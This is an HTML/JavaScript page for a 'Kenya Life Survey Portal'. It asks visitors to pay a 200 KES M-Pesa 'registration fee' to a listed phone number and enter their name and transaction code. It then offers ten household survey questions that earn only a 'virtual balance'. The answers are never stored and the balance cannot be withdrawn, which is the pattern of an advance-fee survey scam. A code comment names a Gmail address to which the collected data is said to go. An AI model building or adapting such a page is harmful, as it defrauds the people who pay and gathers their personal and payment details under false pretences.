<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kenya Life Survey Portal</title>
    <style>
        :root { --mpesa-green: #2ecc71; --accent: #00d2ff; --bg: #0f172a; --card: #1e293b; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); color: #f8fafc; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .box { background: var(--card); padding: 35px; border-radius: 24px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #334155; }
        .wallet-bar { background: linear-gradient(90deg, #f59e0b, #d97706); color: #000; padding: 10px; border-radius: 50px; font-weight: 800; margin-bottom: 25px; box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3); }
        .option-btn { background: #334155; color: #fff; border: 1px solid #475569; padding: 15px; width: 100%; border-radius: 12px; margin: 10px 0; cursor: pointer; text-align: left; font-size: 1rem; transition: 0.2s ease; }
        .option-btn:hover { background: #475569; border-color: var(--accent); transform: translateX(5px); }
        .main-btn { background: var(--mpesa-green); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.1rem; box-shadow: 0 4px 14px rgba(46, 204, 113, 0.4); }
        .hidden { display: none; }
        input { width: 100%; padding: 15px; margin: 12px 0; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: #fff; box-sizing: border-box; }
        .info-card { background: #0f172a; padding: 15px; border-radius: 12px; font-size: 0.9rem; text-align: left; margin-bottom: 20px; border-left: 4px solid var(--mpesa-green); }
    </style>
</head>
<body>

<div id="registration-gate" class="box">
    <h2 style="margin-top:0;">Survey Access</h2>
    <p style="color: #94a3b8;">Pay a one-time registration fee to access simple surveys and earn virtual credits.</p>
    
    <div id="mpesa-instructions" class="hidden">
        <div class="info-card">
            <strong>REGISTRATION STEPS:</strong><br>
            1. Send <b>200 KES</b> to: <span style="color:var(--mpesa-green); font-weight:bold;">07960 27150</span><br>
            2. Enter your Name and M-Pesa Code below.
        </div>
    </div>

    <button id="reveal-num-btn" class="main-btn" style="background: #334155;" onclick="revealPayment()">CLICK TO PAY REGISTRATION</button>

    <div id="unlock-form" class="hidden">
        <input type="text" id="full-name" placeholder="Your Full Name">
        <input type="text" id="mpesa-id" placeholder="M-Pesa Transaction Code">
        <button class="main-btn" onclick="grantAccess()">START EARNING</button>
    </div>
</div>

<div id="survey-portal" class="box hidden">
    <div class="wallet-bar">VIRTUAL BALANCE: <span id="kes-bal">0</span> KES</div>
    <p style="color: #94a3b8; font-size: 0.8rem;">Question <span id="step-count">1</span> of 10</p>
    <h3 id="question-label" style="margin-bottom: 25px;">...</h3>
    <div id="options-list"></div>
</div>

<script>
    let currentStep = 0;
    let balance = 0;

    const mySurveys = [
        { q: "What is your primary residence type?", options: ["Single Room", "Bungalow", "Apartment", "Homestead"] },
        { q: "Where do you get your daily water?", options: ["Piped Water", "Borehole", "River/Well", "Purchased"] },
        { q: "How many meals do you have per day?", options: ["One", "Two", "Three", "Four+"] },
        { q: "What is your main mode of cooking?", options: ["Gas (LPG)", "Charcoal", "Firewood", "Electricity"] },
        { q: "How do you travel to work/market?", options: ["Walking", "Motorbike (Boda)", "Matatu", "Private Car"] },
        { q: "Do you engage in any farming?", options: ["Poultry/Chicken", "Kitchen Garden", "Cash Crops", "No Farming"] },
        { q: "What is the floor type of your house?", options: ["Tiled", "Cemented", "Earthen/Mud", "Wooden"] },
        { q: "How many people live in your house?", options: ["1-2", "3-4", "5-6", "7+"] },
        { q: "What is your main lighting source?", options: ["Grid Power", "Solar", "Kerosene Lamp", "Battery/Torch"] },
        { q: "Is the road to your home accessible?", options: ["Yes, Tarmac", "Yes, Murram", "No, Rough Road", "Seasonal"] }
    ];

    function revealPayment() {
        document.getElementById('mpesa-instructions').classList.remove('hidden');
        document.getElementById('unlock-form').classList.remove('hidden');
        document.getElementById('reveal-num-btn').classList.add('hidden');
    }

    function grantAccess() {
        const n = document.getElementById('full-name').value;
        const c = document.getElementById('mpesa-id').value;
        if(n && c) {
            // Data is sent to you at fidelsteven71@gmail.com via Admin verification
            document.getElementById('registration-gate').classList.add('hidden');
            document.getElementById('survey-portal').classList.remove('hidden');
            showQuestion();
        } else {
            alert("Please enter Name and M-Pesa Code.");
        }
    }

    function showQuestion() {
        const data = mySurveys[currentStep];
        document.getElementById('step-count').innerText = currentStep + 1;
        document.getElementById('question-label').innerText = data.q;
        const list = document.getElementById('options-list');
        list.innerHTML = '';
        
        const labels = ['A', 'B', 'C', 'D'];
        data.options.forEach((opt, i) => {
            const btn = document.createElement('button');
            btn.className = 'option-btn';
            btn.innerText = labels[i] + ". " + opt;
            btn.onclick = () => recordAndNext();
            list.appendChild(btn);
        });
    }

    function recordAndNext() {
        if (currentStep < 9) {
            currentStep++;
            showQuestion();
        } else {
            balance += 50;
            document.getElementById('kes-bal').innerText = balance;
            alert("Survey Done! 50 KES added to your Virtual Balance.");
            currentStep = 0;
            showQuestion();
        }
    }
</script>

</body>
</html>
